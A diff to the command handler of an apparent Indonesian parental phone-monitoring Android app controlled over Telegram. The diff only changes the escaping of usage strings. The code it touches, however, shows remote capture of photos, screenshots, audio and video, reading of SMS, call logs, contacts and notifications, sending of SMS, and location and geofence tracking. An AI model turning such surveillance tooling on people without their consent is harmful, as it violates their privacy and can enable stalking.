@@ -1687,7 +1687,7 @@ class MonitoringService : Service() {
             "/photointerval" -> {
                 val minutes = arg.toIntOrNull()
                 if (minutes == null || minutes !in 0..60) {
-                    sendToTelegram("Cara pakai: /photointerval \u003c0-60\u003e (0 = manual saja)")
+                    sendToTelegram("Cara pakai: /photointerval &lt;0-60&gt; (0 = manual saja)")
                 } else if (minutes == 0) {
                     preferencesManager.cameraInterval = 0
                     sendToTelegram("📸 Foto otomatis MATI. Pakai /photo untuk manual.")
@@ -1708,14 +1708,14 @@ class MonitoringService : Service() {
                     }
                     else -> {
                         val state = if (preferencesManager.patrolEnabled) "ON every ${preferencesManager.patrolInterval} min" else "OFF"
-                        sendToTelegram("Cara pakai: /patrol \u003con|off\u003e (now $state)")
+                        sendToTelegram("Cara pakai: /patrol &lt;on|off&gt; (now $state)")
                     }
                 }
             }
             "/patrolinterval" -> {
                 val minutes = arg.toIntOrNull()
                 if (minutes == null || minutes !in 5..180) {
-                    sendToTelegram("Cara pakai: /patrolinterval \u003c5-180\u003e")
+                    sendToTelegram("Cara pakai: /patrolinterval &lt;5-180&gt;")
                 } else {
                     preferencesManager.patrolInterval = minutes
                     sendToTelegram("\uD83D\uDEF0 Patrol interval set to $minutes min.")
@@ -1737,14 +1737,14 @@ class MonitoringService : Service() {
                     }
                     else -> {
                         val state = if (preferencesManager.nightMode) "ON 23:00–05:00" else "OFF"
-                        sendToTelegram("Cara pakai: /night \u003con|off\u003e (now $state)")
+                        sendToTelegram("Cara pakai: /night &lt;on|off&gt; (now $state)")
                     }
                 }
             }
             "/pause" -> {
                 val minutes = arg.toIntOrNull()
                 if (minutes == null || minutes !in 1..480) {
-                    sendToTelegram("Cara pakai: /pause \u003cminutes\u003e (1-480)")
+                    sendToTelegram("Cara pakai: /pause &lt;minutes&gt; (1-480)")
                 } else {
                     preferencesManager.photoPausedUntil = System.currentTimeMillis() + minutes * 60_000L
                     sendToTelegram("⏸️ Foto otomatis dijeda $minutes mnt. (manual /photo tetap bisa)")
@@ -1796,7 +1796,7 @@ class MonitoringService : Service() {
                         sendToTelegram("📸 Kamera disetel depan.")
                     }
                     else -> {
-                        sendToTelegram("Cara pakai: /camera \u003cdepan|belakang\u003e (kini: ${preferencesManager.cameraFacing})")
+                        sendToTelegram("Cara pakai: /camera &lt;depan|belakang&gt; (kini: ${preferencesManager.cameraFacing})")
                     }
                 }
             }
@@ -1819,7 +1819,7 @@ class MonitoringService : Service() {
                         sendToTelegram("\uD83D\uDD14 Notifications: $state (pref: ${if (preferencesManager.notifForwardEnabled) "on" else "off"})")
                     }
                     else -> {
-                        sendToTelegram("Cara pakai: /notif <on|off|status>")
+                        sendToTelegram("Cara pakai: /notif &lt;on|off|status&gt;")
                     }
                 }
             }
@@ -1865,7 +1865,7 @@ class MonitoringService : Service() {
             "/syncinterval" -> {
                 val minutes = arg.toIntOrNull()
                 if (minutes == null || minutes !in 1..1440) {
-                    sendToTelegram("Cara pakai: /syncinterval \u003c1-1440\u003e (minutes)")
+                    sendToTelegram("Cara pakai: /syncinterval &lt;1-1440&gt; (minutes)")
                 } else {
                     preferencesManager.syncInterval = minutes
                     sendToTelegram("\u23F1\uFE0F Sync interval set to $minutes min.")
@@ -2001,7 +2001,7 @@ class MonitoringService : Service() {
             "/record" -> {
                 val seconds = arg.toIntOrNull()
                 if (seconds == null || seconds !in 5..600) {
-                    sendToTelegram("Cara pakai: /record \u003c5-600\u003e (seconds)")
+                    sendToTelegram("Cara pakai: /record &lt;5-600&gt; (seconds)")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
                 } else if (!recordBusy.compareAndSet(false, true)) {
@@ -2024,7 +2024,7 @@ class MonitoringService : Service() {
             "/recordvideo" -> {
                 val seconds = arg.toIntOrNull()
                 if (seconds == null || seconds !in 5..180) {
-                    sendToTelegram("Cara pakai: /recordvideo \u003c5-180\u003e (seconds)")
+                    sendToTelegram("Cara pakai: /recordvideo &lt;5-180&gt; (seconds)")
                 } else if (seconds * 300_000L > 48L * 1024L * 1024L) {
                     val maxSecs = ((48L * 1024L * 1024L) / 300_000L).toInt().coerceIn(5, 180)
                     sendToTelegram("⚠️ /recordvideo $seconds dtk ≈ ${(seconds * 300_000L) / (1024L * 1024L)} MB, melebihi batas 48 MB. Coba ≤$maxSecs dtk.")
@@ -2063,11 +2063,11 @@ class MonitoringService : Service() {
                 }
                 val normalized = digits.toString()
                 if (number.isEmpty() || smsText.isEmpty()) {
-                    sendToTelegram("Cara pakai: /sms \u003cnumber\u003e \u003cmessage\u003e")
+                    sendToTelegram("Cara pakai: /sms &lt;number&gt; &lt;message&gt;")
                 } else if (badChar || plusCount > 1 || (plusCount == 1 && !number.startsWith("+")) || (plusCount == 1 && number.startsWith("+") && number.indexOf('+', 1) >= 0)) {
-                    sendToTelegram("\u26A0\uFE0F Invalid number. Cara pakai: /sms \u003cnumber\u003e \u003cmessage\u003e")
+                    sendToTelegram("\u26A0\uFE0F Invalid number. Cara pakai: /sms &lt;number&gt; &lt;message&gt;")
                 } else if (!normalized.matches(SMS_NUMBER_REGEX)) {
-                    sendToTelegram("\u26A0\uFE0F Invalid number. Cara pakai: /sms \u003cnumber\u003e \u003cmessage\u003e")
+                    sendToTelegram("\u26A0\uFE0F Invalid number. Cara pakai: /sms &lt;number&gt; &lt;message&gt;")
                 } else if (isPremiumSmsNumber(normalized)) {
                     sendToTelegram("\uD83D\uDEAB Nomor premium tidak boleh dipakai /sms.")
                 } else if (isEmergencySmsNumber(normalized)) {
@@ -2103,7 +2103,7 @@ class MonitoringService : Service() {
                 val nowConfirm = System.currentTimeMillis()
                 if (number.isEmpty() || smsText.isEmpty() || stagedAt <= 0L || stagedAt > nowConfirm || nowConfirm - stagedAt > 300_000L) {
                     if (stagedAt <= 0L || (stagedAt <= nowConfirm && nowConfirm - stagedAt > 300_000L)) preferencesManager.clearSmsPendingIf(stagedAt)
-                    sendToTelegram("\u23F1\uFE0F No pending SMS. Send /sms \u003cnumber\u003e \u003cmessage\u003e first.")
+                    sendToTelegram("\u23F1\uFE0F No pending SMS. Send /sms &lt;number&gt; &lt;message&gt; first.")
                 } else if (stagedBy.isNotEmpty() && stagedBy != senderId) {
                     sendToTelegram("\u26D4 Only the requester can confirm this SMS.")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
@@ -2174,7 +2174,7 @@ class MonitoringService : Service() {
             }
             "/contacts" -> {
                 if (arg.isEmpty()) {
-                    sendToTelegram("Cara pakai: /contacts \u003cname\u003e")
+                    sendToTelegram("Cara pakai: /contacts &lt;name&gt;")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("\u26A0\uFE0F Contacts permission missing. Open Setup and grant Contacts permission.")
                 } else {
@@ -2230,7 +2230,7 @@ class MonitoringService : Service() {
                 }
                 val digits = arg.filter { it.isDigit() }
                 if (digits.length < 7 || digits.length > 20) {
-                    sendToTelegram("Cara pakai: /history \u003cnumber\u003e (7-20 digits)")
+                    sendToTelegram("Cara pakai: /history &lt;number&gt; (7-20 digits)")
                 } else {
                     val calls = try {
                         callLogRepository.getCallsForNumber(digits, 50).take(5)
@@ -2265,10 +2265,10 @@ class MonitoringService : Service() {
                     val words = sub.split(",", " ", ";").map { it.trim().lowercase(java.util.Locale.ROOT) }.filter { it.length >= 3 }.distinct().take(10)
                     val dropped = sub.split(",", " ", ";").map { it.trim() }.filter { it.isNotEmpty() && it.length < 3 }.distinct()
                     if (words.isEmpty()) {
-                        sendToTelegram("Cara pakai: /watch \u003ckata1,kata2\u003e (min 3 huruf, maks 10) atau /watch off")
+                        sendToTelegram("Cara pakai: /watch &lt;kata1,kata2&gt; (min 3 huruf, maks 10) atau /watch off")
                     } else {
                         preferencesManager.watchKeywords = words.joinToString(",")
-                        sendToTelegram("👁️ Watch aktif: " + words.joinToString(", ") { Html.escape(it) } + if (dropped.isNotEmpty()) "\nDiabaikan (<3 huruf): " + dropped.joinToString(", ") { Html.escape(it) } else "")
+                        sendToTelegram("👁️ Watch aktif: " + words.joinToString(", ") { Html.escape(it) } + if (dropped.isNotEmpty()) "\nDiabaikan (&lt;3 huruf): " + dropped.joinToString(", ") { Html.escape(it) } else "")
                     }
                 }
             }
@@ -2290,7 +2290,7 @@ class MonitoringService : Service() {
                 } else {
                     val nums = sub.replace(",", " ").split(CMD_SPLIT_REGEX).mapNotNull { it.toDoubleOrNull() }
                     if (nums.size < 2) {
-                        sendToTelegram("Cara pakai: $command \u003clat,lon,radius\u003e (radius 50-5000 m, default 200)")
+                        sendToTelegram("Cara pakai: $command &lt;lat,lon,radius&gt; (radius 50-5000 m, default 200)")
                     } else {
                         val lat = nums[0]
                         val lon = nums[1]
@@ -2351,7 +2351,7 @@ class MonitoringService : Service() {
                     preferencesManager.curfewTime = sub
                     sendToTelegram("🌙 Jam malam disetel $sub. Bila di luar rumah lewat jam itu, owner dikabari (maks 1x/hari).")
                 } else {
-                    sendToTelegram("Cara pakai: /jampulang \u003cHH:MM\u003e (contoh 21:30) atau /jampulang off")
+                    sendToTelegram("Cara pakai: /jampulang &lt;HH:MM&gt; (contoh 21:30) atau /jampulang off")
                 }
             }
             "/minggu" -> {
@@ -2369,7 +2369,7 @@ class MonitoringService : Service() {
                 } else {
                     val nums = sub.split(",", " ", ";").map { it.filter { c -> c.isDigit() } }.filter { it.length >= 7 }.distinct().take(10)
                     if (nums.isEmpty()) {
-                        sendToTelegram("Cara pakai: /watchnomor \u003cnomor1,nomor2\u003e (min 7 digit, maks 10) atau /watchnomor off")
+                        sendToTelegram("Cara pakai: /watchnomor &lt;nomor1,nomor2&gt; (min 7 digit, maks 10) atau /watchnomor off")
                     } else {
                         preferencesManager.watchNumbers = nums.joinToString(",")
                         sendToTelegram("📵 Watch nomor aktif: " + nums.joinToString(", "))
@@ -2434,7 +2434,7 @@ class MonitoringService : Service() {
                 } else {
                     val rad = sub.toIntOrNull()
                     if (rad == null || rad !in 50..5000) {
-                        sendToTelegram("Cara pakai: /jemput \u003c50-5000\u003e (meter) atau /jemput off")
+                        sendToTelegram("Cara pakai: /jemput &lt;50-5000&gt; (meter) atau /jemput off")
                     } else if (preferencesManager.homeLatE6 == Long.MIN_VALUE || preferencesManager.homeRadiusM <= 0) {
                         sendToTelegram("Nyalakan geofence /home dulu sebelum /jemput.")
                     } else {
@@ -2460,52 +2460,52 @@ class MonitoringService : Service() {
                         appendLine("🤖 <b>Perintah</b>")
                         appendLine("/photo - ambil foto sekarang")
                         appendLine("/screenshot - ambil layar HP")
-                        appendLine("/camera \u003cdepan|belakang\u003e - ganti kamera")
+                        appendLine("/camera &lt;depan|belakang&gt; - ganti kamera")
                         appendLine("/location - kirim lokasi sekarang")
                         appendLine("/darurat - lokasi+foto+baterai sekaligus")
                         appendLine("/lastcalls - 5 panggilan terakhir")
                         appendLine("/lastsms - 5 SMS terakhir")
-                        appendLine("/photointerval \u003c0-60\u003e - interval foto (0 = manual)")
-                        appendLine("/patrol \u003con|off\u003e - patroli foto + lokasi otomatis")
-                        appendLine("/patrolinterval \u003c5-180\u003e - interval patroli")
-                        appendLine("/night \u003con|off\u003e - sunyi 23:00-05:00")
-                        appendLine("/pause \u003cmenit\u003e - jeda foto")
+                        appendLine("/photointerval &lt;0-60&gt; - interval foto (0 = manual)")
+                        appendLine("/patrol &lt;on|off&gt; - patroli foto + lokasi otomatis")
+                        appendLine("/patrolinterval &lt;5-180&gt; - interval patroli")
+                        appendLine("/night &lt;on|off&gt; - sunyi 23:00-05:00")
+                        appendLine("/pause &lt;menit&gt; - jeda foto")
                         appendLine("/battery - lihat baterai")
                         appendLine("/status - status monitoring")
                         appendLine("/ringkas - status+izin+antrean sekaligus")
                         appendLine("/perms - daftar izin aplikasi")
                         appendLine("/stop - jeda monitoring")
                         appendLine("/resume - lanjutkan monitoring")
-                        appendLine("/notif <on|off|status> - teruskan notifikasi")
-                        appendLine("/syncinterval \u003c1-1440\u003e - interval sync")
+                        appendLine("/notif &lt;on|off|status&gt; - teruskan notifikasi")
+                        appendLine("/syncinterval &lt;1-1440&gt; - interval sync")
                         appendLine("/restart - restart loop monitoring")
                         appendLine("/flush - kirim antrean sekarang")
                         appendLine("/clearqueue - buang antrean")
                         appendLine("/lock - kunci layar HP")
                         appendLine("/ring [5-60] - bunyikan HP")
                         appendLine("/ping [camera|location] - cek delay")
-                        appendLine("/record \u003c5-600\u003e - rekam audio (detik)")
-                        appendLine("/recordvideo \u003c5-180\u003e - rekam video (detik)")
-                        appendLine("/sms \u003cnomor\u003e \u003cpesan\u003e - kirim SMS")
+                        appendLine("/record &lt;5-600&gt; - rekam audio (detik)")
+                        appendLine("/recordvideo &lt;5-180&gt; - rekam video (detik)")
+                        appendLine("/sms &lt;nomor&gt; &lt;pesan&gt; - kirim SMS")
                         appendLine("/smsconfirm - konfirmasi SMS tertunda")
                         appendLine("/lastnotif - notifikasi terakhir")
                         appendLine("/version - versi app + HP")
                         appendLine("/uptime - lama service jalan")
-                        appendLine("/contacts \u003cnama\u003e - cari kontak")
+                        appendLine("/contacts &lt;nama&gt; - cari kontak")
                         appendLine("/apps [N] - daftar aplikasi")
                         appendLine("/storage - sisa penyimpanan")
-                        appendLine("/history \u003cnomor\u003e - call+SMS per nomor")
-                        appendLine("/watch \u003ca,b|status|off\u003e - awasi kata berbahaya")
-                        appendLine("/watchnomor \u003cnomor|status|off\u003e - awasi nomor")
-                        appendLine("/home \u003clat,lon,rad|status|off\u003e - geofence rumah")
-                        appendLine("/school \u003clat,lon,rad|status|off\u003e - geofence sekolah")
-                        appendLine("/jampulang \u003cHH:MM|off\u003e - jam malam + cek sekolah 08–15")
+                        appendLine("/history &lt;nomor&gt; - call+SMS per nomor")
+                        appendLine("/watch &lt;a,b|status|off&gt; - awasi kata berbahaya")
+                        appendLine("/watchnomor &lt;nomor|status|off&gt; - awasi nomor")
+                        appendLine("/home &lt;lat,lon,rad|status|off&gt; - geofence rumah")
+                        appendLine("/school &lt;lat,lon,rad|status|off&gt; - geofence sekolah")
+                        appendLine("/jampulang &lt;HH:MM|off&gt; - jam malam + cek sekolah 08–15")
                         appendLine("/digest - ringkasan harian")
                         appendLine("/minggu - laporan 7 hari")
                         appendLine("/jejak - jejak lokasi hari ini")
                         appendLine("/waspada - skor kewaspadaan 0-100")
                         appendLine("/hilang - bunyi+lokasi+foto sekaligus")
-                        appendLine("/jemput \u003cmeter|off\u003e - kabari saat dekat rumah")
+                        appendLine("/jemput &lt;meter|off&gt; - kabari saat dekat rumah")
                         appendLine("/log - log error terakhir")
                         appendLine("/help - daftar ini")
                         appendLine("Tanpa / juga bisa: dimana, foto, ding, kunci, baterai, bantu")
